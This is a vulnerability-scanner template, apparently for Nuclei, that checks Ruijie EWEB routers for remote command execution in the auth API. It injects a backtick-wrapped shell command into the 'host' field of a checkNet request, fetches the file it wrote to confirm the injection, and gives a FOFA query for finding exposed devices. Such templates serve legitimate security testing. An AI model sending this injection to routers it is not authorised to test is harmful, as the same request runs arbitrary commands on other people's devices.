http:
- matchers:
  - part: body
    type: word
    words:
    - '{{a1}}'
  raw:
  - 'POST /cgi-bin/luci/api/auth HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15
    (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15


    {"method":"checkNet","params":{"host":"`echo {{a1}}>{{a2}}.txt`"}

    '
  - 'GET /cgi-bin/{{a2}}.txt HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15
    (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

    '
id: ruijie_EWEB_route_auth_rce
info:
  author: vitasoy
  description: "\u9510\u6377EWEB\u8DEF\u7531\u5668 auth \u8FDC\u7A0B\u547D\u4EE4\u6267\
    \u884C\u6F0F\u6D1E"
  metadata:
    fofa-query: fofabody="cgi-bin/luci" && body="#f47f3e"
  name: ruijie_EWEB_route_auth_rce
  reference: 'https://mp.weixin.qq.com/s/RPOiYNJdwLkXtmDbQa7dRg

    '
  severity: critical
  tags: ruijie, EWEB, rce
variables:
  a1: '{{randstr}}'
  a2: '{{rand_base(6)}}'
